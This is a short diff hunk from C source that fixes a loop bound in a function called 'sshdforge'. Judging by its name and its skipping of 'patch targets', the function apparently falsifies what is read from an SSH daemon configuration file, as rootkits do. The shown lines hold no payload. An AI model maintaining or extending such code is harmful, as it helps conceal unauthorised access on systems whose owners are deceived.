@@ -22,7 +22,7 @@ FILE *sshdforge(const char *pathname){
     while(fgets(line,sizeof(line),fp) != NULL){
         skipline = 0;
 
-        for(int i = 0; i != PATCHTARGETS_SIZE; i++){
+        for(int i = 0; i < PATCHTARGETS_SIZE; i++){
             if(res[i] == 1)
                 continue;
 
